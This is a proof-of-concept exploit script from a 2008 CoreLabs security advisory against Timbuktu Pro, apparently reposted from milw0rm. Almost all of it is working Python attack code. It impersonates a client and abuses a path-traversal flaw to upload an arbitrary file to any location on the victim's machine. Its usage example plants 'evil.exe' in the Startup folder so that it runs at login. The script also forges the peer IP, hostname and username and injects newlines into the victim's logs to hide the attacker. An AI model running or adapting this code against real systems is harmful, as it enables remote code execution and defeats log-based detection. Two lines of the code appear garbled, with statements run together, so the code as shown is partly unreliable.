# Core Security Technologies - CoreLabs Advisory
#  http://www.coresecurity.com/corelabs

# Title: Timbuktu Pro Remote Path Traversal and Log Injection
# Advisory ID: CORE-2008-0204
# Advisory URL: http://www.coresecurity.com/?action=item&id=2166
# Date published: 2008-03-11
# Date of last update: 2008-03-11
# Vendors contacted: Motorola
# Release mode: Forced release

#  Proof of concept code follows. This PoC allows a remote attacker to
# upload a file to an arbitrary location on the victim's machine and forge
# peer information on the log lines of the victim's application.

from sys        import argv
from socket     import *
from struct     import pack

#from utils      import printFormatted
#from time import sleep

init_send_op_packet =   (   '\x00\x01\x60\x00\x00\x52\x00\x25'
                            '\x00\x22\x02\x01\x00\x04\x03\x07'
                            '\x00\x05\x00\x01\x00\x00\x00\xf1'
                            '\x06\x00\xf7\x76\xdd\x77\x00\x00'
                            '\x00\x00\x08\x7c\x67\x60\x00\x00'
                            '\x00\x00\x00\x00\x00\x00\x00\x00'
                            '\x00\x00\x18\xf1\x06\x00\xd1\x90'
                            '\xbc\x60\x38\xf1\x06\x00\x32\x94'
                            '\xc1\x60\x50\x92\xc4\x60\x00\x00'
                            '\x00\x00\x18\x92\xc4\x60\x2d\xbe'
                            '\x80\x7c\x08\x7c\x67\x60\x20\x46'
                        )

second_send_op_packet  = (  '\x00\x01\x61\x00\x00\x52\x00\x25'
                            '\x00\x22\x02\x01\x00\x04\x03\x07'
                            '\x00\x05\x00\x01\x10\x00\xe0\xf0'
                            '\x06\x00\x51\x05\x91\x7c\x28\x09'
                            '\x08\x00\x6d\x05\x91\x7c\x1c\xf1'
                            '\x06\x00\x02\x00\x00\x00\x10\x00'
                            '\x00\x00\xb8\xf5\xbe\x60\x00\x00'
                            '\xac\x00\x00\x00\x00\x00\xbd\xf5'
                            '\xbe\x60\x30\x90\xc4\x60\x07\x00'
                            '\x00\x00\xd0\x13\x63\x60\x71\xfb'
                            '\x90\x7c\x40\xf0\x06\x00\x0e\x00'
                            )

peer_info_exchange      = ( '\x00\x01\x62\x00\x00\xb0\x00\x23'
                            '\x07\x22\x03\x07\x70\x2c\xa5\x51'
                            '\x4c\xca\xe3\xfb\x70\x2c\xa5\x51'
                            '\x4c\xca\xe3\xfb\x00\x09'
                            '%(user_name)s'
                            '\x01\x97'
                            '%(host_name)s'
                            ''
                            '\x00\x00\x01\x02\x00\x04'
                            '\xb1\x1c\x39\x51\x00\x00\x00\x00'
                            '%(guest_ip_address)s'
                            '\x00\x00\x00\x00\x00\x00'
                            '\x00\x00\x00\x00\x00\x00'
                            )

ack_peer_info           =   '\xff'

attach_info_packet      = ('\xfb\x00\x00\x00\x00'
                            'BINAmdos'
                            '\xc2\x12\x49\xaf\xbd\x35\xac\x98'
                            '\x00\x00\x00\x00'
                            '%(attachment_length)s'
                            '\x00\x00\x00\x00'
                            '\xff\xff\xff\xff\x00\x00\x00\x00'
                            '\x00\x00\x00\x00\x00\x00\x00\x00'
                            '\x00\x00\x00\x00\x00\x00'
                            '%(attachment_filename)s'
                            )

attach_info_ack1        =  '\xf9\x00'

# Transfer file content here !!!
# \xF8 + 2 byte length + data

attach_file_ack1      =  '\xf7'

attach_file_ack2      =  '\xfa'


class Tb2FileSender:
    '''
    Fake timbuktu client that implements the 'Notes' feature to send a
    message with a file attached to it.
    '''

    def __init__(self, target, fake_src_ip, fake_hostname, fake_username, dest_filename, file_content):
        '''
        Setup TCP Connection to standard port TCP/407
        '''
        self.sck = socket(AF_INET, SOCK_STREAM)
        self.sck.connect((target, 407))
        self.fake_src_ip    = fake_src_ip
        self.fake_hostname  = fake_hostname     # Peer computer name
        self.fake_username  = fake_username     # Peer user name
        self.dest_filename  = dest_filename     # Destination filename including path (like ../../a.exe)
        self.file_content   = file_content      # Content of the destination file

    def sendAndRecv(self, packet, log, expected_response_length=0x500, print_response=False):
        self.sck.send(packet)
        if log:
            print '[-] %s' % log
        if expected_response_length > 0:
            resp = self.sck.recv(expected_response_length)
            if print_response:
                #printFormatted(resp)
                print '-' * 70 + '\n'
            return resp
        return None

    def getPascalString(self, str):
        '''
        Format the strings as 1 Byte Length + String.
        '''
        return pack('B', len(str)) + str

    def createFakePeerInfoPacket(self):
        '''
        Create a packet with forged guest information to avoid giving away
        real info in the log files.
        '''
        #
        # Ohhh... by the way, these two names goes diretly to the log file... ehehhee  :) 
        #
        guest_host_name      = self.fake_hostname.replace('\\n', '\r\n')
        guest_user_name      = self.fake_username.replace('\\n', '\r\n')

        username_max_len     = 0x37 # This is not the application real limit,
        hostname_max_len     = 0x3f #   but it is the limit for this packet.

        host_name            = self.getPascalString(guest_host_name)
        user_name            = self.getPascalString(guest_user_name)

        # Pad the string to fill the empty space and avoid packet length recalculation
        host_name           += ('\x00' * (hostname_max_len - len(guest_host_name)))
        user_name           += ('\x00' * (username_max_len - len(guest_user_name)))

        guest_ip_address     = self.fake_src_ip.split('.')
        guest_ip_address     = pack('BBBB', int(guest_ip_address[0]), int(guest_ip_address[1]), int(guest_ip_address[2]), int(guest_ip_address[3]))

        return peer_info_exchange % vars()

    def getAttachContent(self):
        '''
        Retrieve the content of the local file and send it as the attach content.
        '''
        fd      = open(self.file_content, 'rb')
        data    = fd.read()
        fd.close()
        return data

    def send(self):
        '''
        Send a sequence of packet to upload our data to the filename and path
        specified by the user's parameters.
        '''

        # Begin protocol negotiation with the target
        self.sendAndRecv(init_send_op_packet,               'Note Operation initial packet sent.')
        self.sendAndRecv(second_send_op_packet,             'Note Operation negotiation packet sent.')

        # Send the packet with our fake info to fool the logs  :) 
        self.sendAndRecv(self.createFakePeerInfoPacket(),   'Peer info packet sent.')
        self.sendAndRecv(ack_peer_info,                     'Ack peer info packet sent.')

        # Setup attachment packets that contain information about the file being transfered
        max_trx_chunk_size  = 0x5B4
        trx_until_resync    = 0x16C5

        payload             = self.getAttachContent()
        payload_length      = len(payload)
        attachment_length   = pack('>L', payload_length)

        #
        # Send info about the attachment.
        #
        # The '\' character is nedded to bypass the application filter.
        # This is actually the Bug !
        attachment_filename  = self.getPascalString('\\' + self.dest_filename.replace('\\', '/'))

        attach_info          = attach_info_packet % vars()

        self.sendAndRecv(attach_info     ,   'Attachment info sent.')
        self.sendAndRecv(attach_info_ack1,   'Attachment intermediate info sent.')

        # Create a list with the chunks to send and prepare their headers is appropriate
        attachment_content   = list()

        # We check if the data to send fits into one set of chunks.
        if payload_length < max_trx_chunk_size:
            attachment_content.append('\xF8' + pack('>H', payload_length) + payload)
        else:
            # If the data is bigger than one chunk, then send multiple chunks and their headers.
            curr_pos        = 0     # keeps our current position into the data file content
            resync_chunk    = True  # flag to indicate if a new set of chunk should be set
            pos_in_chunk    = 0     # keeps our position into the current chunk set
            do_recv         = False # flag to indicate if recv is needed to receive target data

            while curr_pos <= payload_length:
                do_recv      = False
                # Is this the last chunk ?
                if curr_pos > 0 and pos_in_chunk != trx_until_resync:
                    # If it is the last chunk, then just set length to the rest of the data
                    if trx_until_resync - pos_in_chunk < max_trx_chunk_size:
                        chunk_length = trx_until_resync - pos_in_chunk
                        do_recv = True
                    else:
                        # Otherwise, set the data length as usual because it's an intermediate chunk
                        chunk_length = max_trx_chunk_size data         = ''
                else:
                    # Start a new set of chunks and check if this is not the last set
                    # If it is, then don't set the maximun size, just the rest of the length.
                    data         = '\xF8'   # Set the chunk set header
                    if payload_length - curr_pos < trx_until_resync:
                        chunk_length = payload_length - curr_pos
                        data        += pack('>H', chunk_length)
                    else:
                        # This is not the last chunk, so we set the maximun size and begin
                        #   it transmittion.
                        chunk_length = max_trx_chunk_size
                        data        += pack('>H', trx_until_resync) pos_in_chunk = 0

                # Append the current chunk into a list to be sent later
                attachment_content.append((do_recv, data + payload[curr_pos : curr_pos + chunk_length]))
                curr_pos        += chunk_length
                pos_in_chunk    += chunk_length

        #
        # Send file content in small chunks
        #
        print '[-] Beginning file transfer... (this may take some time)'
        for chunk in attachment_content:
            if chunk[0]:
                do_recv = 0x500
            else:
                do_recv = 0
            self.sendAndRecv(chunk[1], '', do_recv)
            #sleep(0.5)
        print '[-] File transfer complete'

        # Send the final ACKs to allow the program to create the remote file.
        self.sendAndRecv(attach_file_ack1,   'Note body intermediate info sent.')
        self.sendAndRecv(attach_file_ack2,   'Note body intermediate info sent.')

        # Close the connection here to avoid the program displaying any message
        self.sck.close()
        return


if __name__ == "__main__":
    if len(argv) != 7:
        print (r'\nUsage:\n\n%s <target> <fake_source_ip> <fake_hostname> '
                '<fake_username> <dest_filename_with_path> <file2upload>\n\n'
                'Example:\n\n'
                '%s victim.com 1.2.3.4 trust.com yourAdmin "..\..\..\Documents And Settings\All Users\Start Menu\Programs\Startup\evil.exe" c:\payload.exe' % (argv[0], argv[0]) )
    else:
        target          = argv[1]
        fake_src_ip     = argv[2]
        fake_hostname   = argv[3]
        fake_username   = argv[4]
        dest_filename   = argv[5]
        file_content    = argv[6]

        tb2 = Tb2FileSender(target, fake_src_ip, fake_hostname, fake_username, dest_filename, file_content)
        tb2.send()

# milw0rm.com [2008-03-11]
